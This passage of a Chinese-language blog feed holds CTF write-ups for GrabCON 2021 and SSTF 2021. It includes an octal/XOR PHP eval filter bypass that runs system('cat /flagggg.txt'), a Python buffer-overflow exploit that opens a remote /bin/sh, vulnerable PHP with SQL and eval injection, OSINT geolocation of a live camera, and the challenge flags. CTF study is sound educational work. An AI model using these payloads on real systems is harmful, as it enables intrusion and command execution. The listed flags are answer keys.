&lt;p>ç„¶åŽç”¨Adminçš„åå­—ç™»å…¥&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907105241455.png" alt="image-20210907105241455">&lt;/p>
&lt;p>&lt;code>GrabCON{Null_byt3s_1s_L0v3}&lt;/code>&lt;/p>
&lt;h2 id="webbasic-calc">Web/Basic Calc&lt;/h2>
&lt;blockquote>
&lt;p>Ever used calc based on php?&lt;/p>
&lt;p>Author: &lt;strong>karma&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;eq&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/[A-Za-z`]+/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$eq&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;BAD.&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Result: &amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;echo &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$eq&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; ;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>çŽ°åœ¨çœ‹åˆ°phpçš„é¢˜æ„Ÿè§‰é‚£æ˜¯ç›¸å½“çš„äº²åˆ‡äº†â€¦â€¦&lt;/p>
&lt;p>è™½ç„¶æ˜¯ç›´æŽ¥æœ‰äº†evalï¼Œä½†æ˜¯è¿™ä¸ªæ­£åˆ™è¿‡æ»¤çš„æœ‰ç‚¹ç‹ ï¼Œå­—æ¯å…¨è¢«banæŽ‰ å°±åªèƒ½ç”¨xoræˆ–å…«è¿›åˆ¶çš„æ–¹å¼æ¥æŠŠå­—æ¯æžå‡ºæ¥&lt;/p>
&lt;p>å…«è¿›åˆ¶ç‰ˆæœ¬ï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\154\163&amp;quot;)
// &amp;quot;system&amp;quot;(&amp;quot;ls&amp;quot;)
&amp;quot;\163\171\163\164\145\155&amp;quot;(&amp;quot;\143\141\164\40\57\146\154\141\147\147\147\147\56\164\170\164&amp;quot;)
// &amp;quot;system(&amp;quot;cat /flagggg.txt&amp;quot;)&amp;quot;
&lt;/code>&lt;/pre>&lt;p>xor&lt;/p>
&lt;pre tabindex="0">&lt;code>Ouput:
(&amp;quot;system&amp;quot;)(&amp;quot;cat /flagggg.txt&amp;quot;) = (('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@'))
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907111823056.png" alt="image-20210907111823056">&lt;/p>
&lt;p>&lt;code>GrabCON{b4by_php_f0r_y0u}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š &lt;a href="https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/">https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/&lt;/a> | &lt;a href="https://ctf.0xff.re/2021/uiuctf_2021/phpfuck">https://ctf.0xff.re/2021/uiuctf_2021/phpfuck&lt;/a> | &lt;a href="https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md">https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md&lt;/a> | &lt;a href="https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264">https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264&lt;/a>&lt;/p>
&lt;h2 id="osintprotondate">OSINT/ProtonDate&lt;/h2>
&lt;blockquote>
&lt;p>Can you find the date, when was this email created?&lt;/p>
&lt;p>sc4ry_gh0st@protonmail[dot]com&lt;/p>
&lt;p>GrabCON{dd_mm_yyyy}&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>è¯´å®žè¯ æ˜¯çº¯çŒœçš„&lt;/p>
&lt;p>&lt;code>GrabCON{03_09_2021}&lt;/code>&lt;/p>
&lt;p>ä½†æ˜¯çœ‹äº†wpä¹‹åŽå‘çŽ°è¿™ç¡®å®žæœ‰æ­£è§„çš„åšæ³•ï¼Œä¸€ä¸ªå¼€æºå·¥å…·å«&lt;a href="https://github.com/pixelbubble/ProtOSINT">ProtOSINT&lt;/a>ï¼Œæ‰€ä½¿ç”¨çš„apiå¦‚ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>https://api.protonmail.ch/pks/lookup?op=index&amp;amp;search=sc4ry_gh0st@protonmail.com
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906131321553.png" alt="image-20210906131321553">æ‹¿åˆ°æ—¶é—´æˆ³1630658267ï¼Œå³Fri 3 September 2021 08:37:47 UTC&lt;/p>
&lt;h2 id="osintvictim-1">OSINT/Victim 1&lt;/h2>
&lt;blockquote>
&lt;p>We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?&lt;/p>
&lt;p>&lt;a href="http://31.207.115.133:8080/cgi-bin/faststream.jpg?stream=half&amp;amp;fps=15&amp;amp;rand=COUNTER">Live Camera&lt;/a>&lt;/p>
&lt;p>GrabCON{zipcode}&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>ç»™äº†ä¸€ä¸ªæ‘„åƒå¤´çš„åœ°å€ï¼Œç”¨&lt;a href="https://www.iplocation.net/ip-lookup">IP geolocation lookup&lt;/a>æŸ¥ä¸€ä¸‹åœ°ç‚¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906210732263.png" alt="image-20210906210732263">&lt;/p>
&lt;p>ç”»é¢å³ä¸Šæœ‰ä¸ªåœ¨åŠ¨çš„ç¼†è½¦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211008725.png" alt="image-20210906211008725">&lt;/p>
&lt;p>zipcode: 39031&lt;/p>
&lt;p>&lt;code>GrabCON{39031}&lt;/code>&lt;/p>
&lt;h2 id="osintwebsite">OSINT/Website&lt;/h2>
&lt;blockquote>
&lt;p>My friend is having a website named, &amp;ldquo;Great Animals Here&amp;rdquo;. He have leaked the flag on his website. Can you find the flag?&lt;/p>
&lt;p>Hint: He used free website builder tool to create his site. greatanimalshere&lt;/p>
&lt;p>Author: &lt;strong>CETACEAN&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;a href="https://greatanimalshere.weebly.com/">https://greatanimalshere.weebly.com/&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101731335.png" alt="image-20210907101731335">&lt;/p>
&lt;h2 id="osintthe-tour1">OSINT/The Tour(1)&lt;/h2>
&lt;blockquote>
&lt;p>w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?&lt;/p>
&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906211622007.png" alt="image-20210906211622007">&lt;/p>
&lt;p>ç©ºçš„ï¼Œè¯•ä¸€ä¸‹wayback machine&lt;/p>
&lt;pre tabindex="0">&lt;code>https://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/
&lt;/code>&lt;/pre>&lt;p>ä¹Ÿæ˜¯ç©ºçš„ï¼Œç”¨&lt;a href="https://github.com/sherlock-project/sherlock">sherlock&lt;/a>æŸ¥ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906214255872.png" alt="image-20210906214255872">&lt;/p>
&lt;p>åŽé¢çš„å†…å®¹å¯ä»¥&lt;a href="https://kashmir54.github.io/ctfs/GrabCON/#the-tour1">è¯¦è§wp&lt;/a>äº†ï¼Œå¾ˆå°‘åšOSINTï¼Œä½†æ˜¯æ„Ÿè§‰å¥½æœ‰æ„æ€ï¼Œå°±æ˜¯æ‰¾çš„å¥½éº»çƒ¦ï¼Œè„‘æ´žå¥½å¤§ï¼Œä¸å®¹æ˜“å•Š&lt;/p>
&lt;h2 id="osintthe-tour2">OSINT/The Tour(2)&lt;/h2>
&lt;blockquote>
&lt;p>Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}&lt;/p>
&lt;p>Author : &lt;strong>rey&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>wp-&amp;gt;https://kashmir54.github.io/ctfs/GrabCON/#the-tour2&lt;/p>
&lt;h2 id="miscwelcome">Misc/Welcome&lt;/h2>
&lt;blockquote>
&lt;p>GrabCON{welcome_to_grabcon_2021}&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>GrabCON{welcome_to_grabcon_2021}&lt;/code>&lt;/p>
&lt;h2 id="miscdiscord">Misc/Discord&lt;/h2>
&lt;blockquote>
&lt;p>Join our &lt;a href="https://discord.gg/8F9VMVCWb2">discord&lt;/a> server!&lt;/p>
&lt;/blockquote>
&lt;p>æ†¨æ‰¹æœºå™¨äººï¼Œæˆ‘æ²¡æžæ˜Žç™½è¿™ä¸ªæ˜¯æ€Žä¹ˆçŽ©çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905092539802.png" alt="image-20210905092539802">&lt;/p>
&lt;p>tmd è¯•äº†å¥½ä¹… ç»“æžœç«Ÿç„¶åœ¨#role&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210906121117043.png" alt="image-20210906121117043">&lt;/p>
&lt;p>&lt;code>GrabCON{s@n1ty_fl4g_1s_here}&lt;/code>&lt;/p>
&lt;p>fxxxk&lt;/p>
&lt;h2 id="miscyoutube">Misc/YouTube&lt;/h2>
&lt;blockquote>
&lt;p>Find us on YouTube.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>GrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}&lt;/code>&lt;/p>
&lt;h2 id="miscfind-me">Misc/Find me&lt;/h2>
&lt;blockquote>
&lt;p>Checkout author&amp;rsquo;s social media.&lt;/p>
&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210905103746359.png" alt="image-20210905103746359">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210907101222360.png" alt="image-20210907101222360">&lt;/p>
&lt;p>&lt;code>GrabCON{n0_fl4g_h3r3}&lt;/code>&lt;/p>
&lt;h2 id="cryptowarm-up">Crypto/Warm-up&lt;/h2>
&lt;blockquote>
&lt;p>Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.&lt;/p>
&lt;p>Author: &lt;strong>Offen5ive&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>file:///D:/CyberChef_v9.30.0/CyberChef_v9.30.0.html#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)From_Base64('A-Za-z0-9%2B/%3D',true)From_Base32('A-Z2-7%3D',false)&amp;amp;input=UzAxWlJFTlhVMU5KVmtoR1VWWktVa3BhUmtaTk1sTkxTVFZLVkVOV1UweExWbFpZUVZsTFZFbGFUa1ZWVmxSTlMwcElSa2MyVTFkS1ZrcEhWMDFMV0V0YVExVlZWRU5YVGxKT1JsTlZTMWRPVWtkR1MwMUVWVXMxUzBkWFZsTkxTMXBEV0ZGVVExUk9VbGxGVDFWVVRFMVNURlpEVFV4RlNrNU1SMWMwUTBsTFdWbEVRMVJEV0V0V01rWk5WakpXVGtKS1JrMVNTMDlNUWt0SFYwNUVXa3RLVjBVMFZsTk9UbEpUUlZkV1ZFdExTa3hXUjAxQ1VrbE9URWRYTlVOUVMwNVhSa1ZTUTFkTFdraEZTVlZhVWs5Q1RVWkZNakpYUzFaS1ZFTlhVMHRMV2xaV1ZWSlRWVWRHVEVaTFZrTkdSMFpJVlRSU1UxWlFSa2RYV1ZSVFRVdE9WbFJMVkV0VFIwWlNWRUZWU2xGTlVrZEdTVlpVVFVzMVNrWk5WRXhhUzFwV1dFbFdNazVPVGt4Rk5GWlVTMHBLVEZaSlVreFJTbFpLUjFkTlMxUkxUVmxFVTFSRFZrNU9Na1ZSVmpKWFNscExSazFXVEZWS1RrcFVRMVZUUlV0YVYwVTBWakpUUjBKT1JrbFZVMWROVWt4R1RWSk1WVXBTU2xkWE5rTllTMGxaVmxWU1ExUkhRVmxWVDFaRFJrMVNUVVUwVmt0UFMwWktWRU5UVTBWTFdsZEdUVlpMVWtkR1UwVTJWa3hNVFZKTlZrdE5TMWROUmt0WFYwOUxSRXRGV1VaVlZVTldUazR5UlZGVldsSlBRa2RHVFZKTFQwczFTMVJCTTBOTlMwcFdXRkZUUTFoTFdsTkZTVlpNVEUxU1JGWkpNakl5U2xKTVIxZFVVMGhMU1ZsV1ZWTXlWMDVPVTBaSFZUTXlTa3BHUmtzeU0wVkxWa2xXVFZWVFZVdFNTMWhKVkRKWFIwSk9SazFXVERKS1NrMUdSVTFETWt0T1RFVkxVbE5YUzA1WFJVMVZRMUpPVGxORlQxWkVNa3BHTlVaUFZreE1SMFpLVkVGWFUwOUxXVmxWTkZKVFZFZEdXVVZKVmxKUlRsSktSVEl5V2xaS05VdEhWMDVMUjB0V1RFWlZWa05YVGswMFZVZFZNMHhNU2taR1N6SXpXVXRLU2xkWFUxTk1TMGxaVjBkTlMxSkhSa3BGV1ZaTVRFcGFUVlpMVmxOUFNsSkxWRUUxUTFOTE5VdFdSVlpEVjB0V1NFWk5WVkpSU1ZWWlJrMHlNa2RMV2twWFZWWlRTa3RhUzBSQlQwdFJTMUZaUkZOVlExSklWVFpSUFQwOVBRPT0K
&lt;/code>&lt;/pre>&lt;p>å…¨éƒ¨æ˜¯b64åŠ å¯† å¾ˆç®€å•äº†&lt;/p>
&lt;p>&lt;code>GrabCON{dayuum_s0n!}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>å¥½èœå¥½èœï¼Œå¼€å­¦äº† å¥¥é‡Œç»™&lt;/p></description></item><item><title>SSCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</link><pubDate>Sun, 05 Sep 2021 11:09:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/05/ssctf2021-wp/</guid><description>&lt;p>&lt;a href="https://research.samsung.com/sstf">https://research.samsung.com/sstf&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://playground.sstf.site/challenges">https://playground.sstf.site/challenges&lt;/a>&lt;/p>
&lt;h2 id="tutorialpractice-flag-submission">Tutorial/Practice: Flag Submission&lt;/h2>
&lt;p>&lt;code>SCTF{It_15_tim3_t0_hack!!}&lt;/code>&lt;/p>
&lt;h2 id="tutorialbof-101">Tutorial/BOF 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261&amp;amp;authkey=%21AO4uYzudT40Rn_Y&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212261&amp;amp;authkey=%21AO4uYzudT40Rn_Y&amp;amp;em=2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816204446737.png" alt="image-20210816204446737">&lt;/p>
&lt;p>&lt;code>SCTF{n0w_U_R_B0F_3xpEr7}&lt;/code>&lt;/p>
&lt;h2 id="tutorialbof-102">Tutorial/BOF 102&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251&amp;amp;authkey=%21AMhDJ94NiXLWqYs&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212251&amp;amp;authkey=%21AMhDJ94NiXLWqYs&amp;amp;em=2&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">telnetlib&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Telnet&lt;/span>
&lt;span style="color:#111">tn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Telnet&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bof102.sstf.site&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read_until&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;Name &amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;A&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\xe0\x83\x04\x08&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;C&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x34\xa0\x04\x08&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read_until&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">interact&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{B0F_A774ck_w1Th_arg5_1n_x86}&lt;/code>&lt;/p>
&lt;h2 id="tutorialsqli-101">Tutorial/SQLi 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257&amp;amp;authkey=%21ALtIE_cNe-XDn2o&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212257&amp;amp;authkey=%21ALtIE_cNe-XDn2o&amp;amp;em=2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210816201332616.png" alt="image-20210816201332616">&lt;/p>
&lt;p>&lt;code>SCTF{th3_f1rs7_5t3p_t0_the_w3B_h4ckEr}&lt;/code>&lt;/p>
&lt;h2 id="tutorialsqli102">Tutorial/SQLi102&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260&amp;amp;authkey=%21AGPulJniPCbx8v4&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212260&amp;amp;authkey=%21AGPulJniPCbx8v4&amp;amp;em=2&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;./config.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$succ&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;showsrc&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">show_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;step1.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;searchkey&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$succ&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;select * from books where title like &amp;#39;%&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;searchkey&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;%&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">dbconnect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sqli102_step3&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysqli_query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">mysqli_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$db&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$rows&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">mysqli_num_rows&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{b451c_SQLi_5k1lls}&lt;/code>&lt;/p>
&lt;h2 id="tutorialrc-four">Tutorial/RC four&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/rc4-encryption-algorithm/">https://www.geeksforgeeks.org/rc4-encryption-algorithm/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253&amp;amp;authkey=%21AOekQp-wZMxDdfA&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212253&amp;amp;authkey=%21AOekQp-wZMxDdfA&amp;amp;em=2&lt;/a>&lt;/p>
&lt;h2 id="tutorialrsa-101">Tutorial/RSA 101&lt;/h2>
&lt;p>&lt;a href="https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256&amp;amp;authkey=%21ANLCkvPBdXSb8Ko&amp;amp;em=2">https://onedrive.live.com/embed?resid=F7E83213DDD289C7%212256&amp;amp;authkey=%21ANLCkvPBdXSb8Ko&amp;amp;em=2&lt;/a>&lt;/p>
&lt;h2 id="websw-expert-academy">Web/SW Expert Academy&lt;/h2>
&lt;blockquote>
&lt;p>Are you poor at algorithm coding? Here is amazing platform to enhance your coding skill!&lt;/p>
&lt;/blockquote>
